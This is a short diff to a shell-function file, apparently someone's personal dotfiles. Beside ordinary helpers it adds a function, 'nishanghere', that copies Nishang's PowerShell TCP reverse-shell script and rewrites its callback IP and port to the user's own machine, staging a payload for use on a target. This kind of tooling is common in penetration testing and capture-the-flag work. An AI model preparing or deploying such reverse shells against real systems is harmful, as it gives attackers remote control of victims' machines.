@@ -144,6 +144,21 @@ function build_it_in_ubuntu_docker {
   docker run -it -v "$(pwd):$(pwd)" -w "$(pwd)" test
 }
 
+function nishanghere {
+  ATTACKER=$(getmyip)
+  PORT=$1
+  if [ -z "$PORT" ]; then
+    export PORT=4444
+  fi
+  cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 nishang.ps1
+  # take the line, paste at end and remove "PS >"
+  ex -s -c 'g/Invoke.*Tcp -Rev.*192.168.254.226/m$' -c '$s/PS > //' -c wq nishang.ps1
+  # edit the IP
+  ex -s -c "\$s/192.168.254.226/$ATTACKER/" -c wq nishang.ps1
+  # edit the port
+  ex -s -c "\$s/4444/$PORT/" -c wq nishang.ps1
+}
+
 # Add this to your .bashrc, .zshrc or equivalent.
 # Run 'fff' with 'f' or whatever you decide to name the function.
 f() {
